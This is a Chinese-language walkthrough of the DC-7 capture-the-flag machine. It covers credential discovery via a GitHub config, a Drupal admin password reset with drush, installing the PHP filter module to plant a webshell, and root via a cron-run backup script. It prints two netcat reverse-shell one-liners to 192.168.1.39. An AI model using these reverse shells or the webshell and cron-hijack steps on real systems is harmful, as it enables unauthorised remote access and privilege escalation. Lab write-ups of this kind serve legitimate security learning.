# DC7 
## 简述  
收集信息 发现配置文件密码  重置密码  上传webshell 定时提权  
## 信息查询  

![20191130191011.png](https://i.loli.net/2019/11/30/8eo9IhT4tVJ1Oiu.png)
发现其中的用户名
### 搜索github项目  
![20191130190740.png](https://i.loli.net/2019/11/30/34OUBeGrNytI85w.png)  
发现其中的配置文件  
登录之后发现查看其中的数据 ，发现经常使用备份脚本进行备份，而且该脚本具有s的权限，但是不能对脚本进行修改，所以必须切换为一个能对脚本进行修改的用户  
可以使用drush对drupal网站的用户进行修改用户名和密码  
![20191130193024.png](https://i.loli.net/2019/11/30/EDZXPQW1IJs5ocR.png)  
反弹shell之后就能修改脚本文件了 直接在最后添加数据   
![20191130195607.png](https://i.loli.net/2019/11/30/dXcut6W1RVaKoyk.png)
其中的文件表示是w可以使用用户组对改文件进行修改  
### drush更改webapp的用户名密码  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201234842.png)
```
drush user-password admin --password=password  
这条命令执行的地方必须在/var/www/ 下执行才会成功  
```    
### 发现backup.sh     
在mbox当中提到了backup.sh  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201235334.png)
可以看到权限很奇怪，需要www-data的权限，所以考虑在drupal当中进行写入shell  

## 权限提升  
### 往drupal当中写入shell  
drupal8.上传webshell的方式    在Content—&gt;Add content--&gt;Basic page下，准备添加PHP代码反弹shell，但发现Drupal 8不支持PHP代码，百度后知道Drupal 8后为了安全，需要将php单独作为一个模块导入![.png](en-resource://database/1090:1)
Php介绍页面如下，模块包下载地址也附上https://www.drupal.org/project/phphttps://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz![.png](en-resource://database/1092:1)
点击Install new module，将下载模块包的链接添加上，点击Install![.png](en-resource://database/1094:1)
Install后跳转到模块添加成功页面，然后去激活这个模块![.png](en-resource://database/1096:1)
选择FILTERS，勾选PHP点击Install安装，安装成功后会有提示![.png](en-resource://database/1098:1)
  在其他的drupal版本当中可以留意是否可以修改php文件 只要有edit php 文件的地方就是机会  
![.png](en-resource://database/1100:1)
从中写入的shell是  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200202000252.png) 
```
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.39 1337 >/tmp/f');?> 
```
 
### 定时任务提权 
往其中填写的反弹shell的数据  
![20191130193408.png](https://i.loli.net/2019/11/30/hBPyp25cvFD39wW.png)  
```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.39 1234 >/tmp/f    
```
![20191130194553.png](https://i.loli.net/2019/11/30/KGAYU1wzVrCbPyv.png)
总结  
收集配置信息拿到一个普通的网站权限  
在网站当中反弹了一个普通的shell 
再使用定时任务最后顺利提权  




